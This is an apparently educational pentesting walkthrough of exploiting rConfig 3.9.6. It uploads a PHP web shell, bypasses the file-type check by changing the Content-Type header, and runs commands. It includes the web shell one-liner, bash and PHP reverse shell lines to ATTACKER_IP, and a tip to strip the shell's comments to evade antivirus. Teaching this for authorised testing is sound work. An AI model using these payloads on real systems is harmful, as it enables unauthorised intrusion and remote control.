## 🌍 Why PHP Matters in Pentesting

![Image](https://upload.wikimedia.org/wikipedia/commons/thumb/2/27/PHP-logo.svg/3840px-PHP-logo.svg.png)

![Image](https://cdn.phpjabbers.com/files/frees/simple-php-user-login-script.jpg)

![Image](https://v6docs.rconfig.com/images/v6docsimages/settings_download_key.png)

![Image](https://v6docs.rconfig.com/images/gifs/api_docs.gif)

### Key Fact (Keep As It Is)

> PHP is used by 78.6% of all websites whose server-side programming language we know.

- PHP = **Hypertext Preprocessor**
    
- Server-side scripting language
    
- Runs on Apache/Nginx
    
- Processes form data (like login pages)
    
- Executes commands on the server
    

If we see:

```
login.php
index.php
admin.php
```

➡️ That’s a strong clue we may be able to upload a **PHP web shell**.

---

# 🧠 How PHP Works (Attacker Perspective)

When a user submits:

|Field|Example|
|---|---|
|Username|admin|
|Password|password|

The data is:

1. Sent to server
    
2. Processed by PHP
    
3. Response returned as HTML
    

⚠️ Because PHP executes server-side, we can upload a malicious `.php` file that runs commands.

---

# 🐚 What Is a PHP Web Shell?

A PHP web shell is:

- A `.php` file
    
- Uploaded to server
    
- Executed through browser
    
- Runs OS commands
    

---

# 🧪 Hands-On: Exploiting rConfig 3.9.6

We will:

1. Log into rConfig
    
2. Upload PHP web shell
    
3. Bypass file restrictions
    
4. Execute commands
    

---

## Step 1️⃣ Login to rConfig

Default credentials:

```
admin : admin
```

Navigate:

```
Devices → Vendors → Add Vendor
```

---

## Step 2️⃣ Prepare PHP Web Shell

Example basic PHP shell:

```php
<?php system($_GET['cmd']); ?>
```

Or WhiteWinterWolf shell (more advanced).

⚠️ Remove:

- Comments
    
- Author credits
    
- ASCII art
    

Reason: Signature detection / AV triggers.

---

# 🚫 Upload Restriction Problem

rConfig only allows:

```
.png
.jpg
.gif
```

Uploading:

```
shell.php
```

➡️ Fails.

---

# 🔥 Bypass Using Burp Suite

![Image](https://portswigger.net/burp/documentation/desktop/images/getting-started/quick-start-pro-intercepted-request.png)

![Image](https://portswigger.net/burp/documentation/desktop/images/using-match-and-replace/adding-a-custom-match-and-replace-rule.png)

![Image](https://i.sstatic.net/Fkbbs.png)

![Image](https://proxy-offline-browser.com/professional/img/MM3-WebAssistant-Proxy-Offline-Browser-Firefox-Proxy.png)

---

## Step 3️⃣ Configure Proxy

Browser proxy settings:

|Setting|Value|
|---|---|
|IP|127.0.0.1|
|Port|8080|

Burp intercept ON.

---

## Step 4️⃣ Intercept Upload Request

Find POST request:

```http
Content-Type: application/x-php
```

Change to:

```http
Content-Type: image/gif
```

➡️ Forward request.

Server thinks file is image.

Upload successful.

---

# ✅ Confirm Upload

Message:

```
Added new vendor NetVen to Database
```

Shell saved in:

```
/images/vendor/connect.php
```

---

# 🌐 Execute PHP Web Shell

Navigate:

```
/images/vendor/connect.php
```

Example:

```
http://target/images/vendor/connect.php?cmd=whoami
```

Output:

```
www-data
```

---

# 🖥️ Common Commands to Run First

```bash
whoami
```

```bash
hostname
```

```bash
id
```

```bash
uname -a
```

```bash
cat /etc/passwd
```

---

# 📡 Upgrade to Reverse Shell

Start listener:

```bash
nc -lvnp 4444
```

Execute via PHP shell:

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

Or:

```bash
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

# ⚠️ Web Shell Considerations (Important)

When using web shells:

|Issue|Explanation|
|---|---|
|Auto-delete|App may delete uploads|
|Limited interactivity|Not full shell|
|Command chaining fails|whoami && hostname may fail|
|Instability|Non-interactive shell|
|Logging risk|Leaves traces|

---

# 🛡️ OPSEC Best Practices

During engagement:

|Best Practice|Why|
|---|---|
|Delete shell after use|Avoid detection|
|Use reverse shell|More stable|
|Document hashes|Reporting proof|
|Record upload path|Evidence|
|Avoid leaving comments|Signature detection|

---

# 🔍 Example Documentation Entry

Include in report:

- Filename used
    
- Upload path
    
- Timestamp
    
- SHA1 hash
    
- Screenshot proof
    

Example:

```bash
sha1sum connect.php
```

---

# 🔄 Web Shell → Reverse Shell Workflow

```
Find Upload Vulnerability
        ↓
Upload PHP shell
        ↓
Bypass file type restriction
        ↓
Execute commands
        ↓
Spawn reverse shell
        ↓
Delete PHP shell
        ↓
Privilege escalation
```

---

# 🏆 Key Takeaways

✔ PHP is server-side  
✔ Upload vulnerability = RCE potential  
✔ Burp can bypass file type checks  
✔ Change Content-Type header  
✔ Always upgrade to reverse shell  
✔ Clean up artifacts

---

